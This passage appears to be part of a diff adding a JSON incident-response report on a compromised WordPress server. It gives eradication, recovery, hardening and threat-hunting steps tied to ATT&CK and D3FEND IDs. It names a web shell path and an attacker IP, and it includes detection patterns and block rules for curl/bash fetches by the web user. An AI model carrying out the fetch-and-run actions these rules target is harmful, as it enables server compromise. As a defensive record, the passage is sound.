+    "references": [
+     "T1053.003"
+    ]
+   }
+  ],
+  "eradication": [
+   {
+    "action": "Delete the web shell and any malicious scripts",
+    "detail": "Remove /var/www/html/wp-content/uploads/2026/10/thumb.php and any files created by k.sh, then verify no other unauthorized files exist in the web root.",
+    "references": [
+     "T1505.003"
+    ]
+   },
+   {
+    "action": "Revoke and rotate credentials for www-data",
+    "detail": "Generate a new system user for PHP processes, update file permissions, and ensure the old www-data account has no SSH keys or sudo rights.",
+    "references": [
+     "M1018"
+    ]
+   },
+   {
+    "action": "Patch and update the web stack",
+    "detail": "Apply latest security updates for Ubuntu 22.04, nginx, PHP\u2011FPM, and WordPress plugins to close known vulnerabilities that allowed the upload.",
+    "references": []
+   }
+  ],
+  "recovery": [
+   {
+    "action": "Restore web\u2011server configuration from a known\u2011good backup",
+    "detail": "Deploy a clean copy of the web root and nginx config, then restart nginx and php-fpm services.",
+    "references": []
+   },
+   {
+    "action": "Monitor for re\u2011appearance of the cron job or web shell",
+    "detail": "Enable continuous DET0290 and DET0394 alerts, and set up D3-PLA process lineage monitoring for www-data.",
+    "references": [
+     "DET0290",
+     "DET0394",
+     "D3-PLA"
+    ]
+   }
+  ],
+  "hardening": [
+   {
+    "action": "Enforce least\u2011privilege for web service accounts",
+    "detail": "Limit www-data to only the directories it needs, disable shell access, and apply M1018 user account management controls.",
+    "references": [
+     "M1018"
+    ]
+   },
+   {
+    "action": "Implement executable allowlisting for web\u2011service processes",
+    "detail": "Deploy D3-EAL to allow only approved binaries (nginx, php-fpm, curl if required) and deny unknown scripts.",
+    "references": [
+     "D3-EAL"
+    ]
+   },
+   {
+    "action": "Deploy file integrity monitoring on web directories",
+    "detail": "Use D3-FIM to alert on any new or modified files under /var/www/html, especially .php files.",
+    "references": [
+     "D3-FIM"
+    ]
+   },
+   {
+    "action": "Restrict outbound HTTP traffic from web servers",
+    "detail": "Configure D3-NTF network traffic filtering to allow only required destinations, blocking arbitrary curl/wget downloads.",
+    "references": [
+     "D3-NTF"
+    ]
+   }
+  ],
+  "hunt_leads": [
+   {
+    "log_source": "auditd:SYSCALL",
+    "look_for": "EXECVE events where uid=33 and the command line contains 'curl' or 'bash' following a crontab modification, indicating other compromised cron jobs."
+   },
+   {
+    "log_source": "iptables:LOG",
+    "look_for": "Outbound HTTP connections to 45.153.34.18 or other unknown IPs from the www-data UID."
+   },
+   {
+    "log_source": "nginx access.log",
+    "look_for": "Requests to .php files in /wp-content/uploads/* that return 200, suggesting additional web shells."
+   }
+  ]
+ },
+ "review": {
+  "verdict": "approve",
+  "issues": [],
+  "auto_issues": []
+ },
+ "status": "awaiting_analyst",
+ "saved_at": "2026-10-22"
+}
